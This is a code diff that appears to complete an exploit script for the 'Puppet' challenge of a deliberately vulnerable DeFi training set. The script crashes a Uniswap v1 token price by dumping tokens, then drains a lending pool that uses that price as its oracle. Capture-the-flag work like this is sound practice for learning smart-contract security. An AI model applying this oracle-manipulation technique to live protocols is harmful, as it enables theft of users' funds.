@@ -87,7 +87,7 @@ def calculate_token_to_eth_input_price(
 
 def deploy_uniswap_contract(file_name):
     # NOTE; If you are on windows change the file structure accordingly... '\\'
-    with open("build-uniswap-v1/" + file_name + ".json") as json_file:
+    with open("build-uniswap/" + file_name + ".json") as json_file:
         data = json.load(json_file)
         abi = data["abi"]
         bytecode = data["evm"]["bytecode"]["object"]
@@ -98,10 +98,41 @@ def deploy_uniswap_contract(file_name):
     
 
 def run_exploit():
-    # remove pass and add exploit code here
-    # attacker = accounts[1] - account to be used for exploit
-    pass
+    # exploit: sell a lot of DVT token to the uniswap pool to make the price crash. 
+    # Because the lending pool is using the uniswap pool as oracle, we will be able to borrow all DVT with a small deposit.
 
+    # intiate variables
+    deployer = accounts[0]
+    attacker = accounts[1]
+    token = DamnValuableToken[-1]
+    lending_pool = PuppetPool[-1]
+    
+    # check the balance of the uniswap pool before the operations
+    print(f'dvt_uniswap_exchange: {dvt_uniswap_exchange}')
+    print(f'uniswap token balance before: {Web3.fromWei(token.balanceOf(dvt_uniswap_exchange.address), "ether")}')
+    print(f'uniswap getTokenToEthInputPrice: {Web3.fromWei(dvt_uniswap_exchange.getTokenToEthInputPrice(ONE_ETH_IN_WEI), "ether")}')
+
+    # compute the deposit required to empty the pool
+    depositRequired = lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+    print(f'puppetPool deposit require (before): {Web3.fromWei(depositRequired, "ether")}')
+
+    # approve the attacker token to send it to the uniswap pool
+    token.approve(dvt_uniswap_exchange.address, ATTACKER_INITAL_TOKEN_BALANCE, {"from": attacker})
+
+    # sell all tokens to make the price crash
+    tx = dvt_uniswap_exchange.tokenToEthSwapInput(ATTACKER_INITAL_TOKEN_BALANCE, 1, deadline, {'from': attacker})
+
+    # check the balance of the uniswap pool after the operations
+    print(f'tokenToEthSwapInput return: {tx.return_value}')
+    print(f'uniswap token balance after: {Web3.fromWei(token.balanceOf(dvt_uniswap_exchange.address), "ether")}')
+    print(f'uniswap getTokenToEthInputPrice: {Web3.fromWei(dvt_uniswap_exchange.getTokenToEthInputPrice(ONE_ETH_IN_WEI), "ether")}')
+
+    # compute the deposit required to empty the pool
+    depositRequired = lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+    print(f'puppetPool deposit require (after): {Web3.fromWei(depositRequired, "ether")}')
+
+    # borrow as much DVT as possible from thew puppet pool
+    lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, {'from': attacker, 'value': depositRequired})
 
 def after():
     attacker = accounts[1]
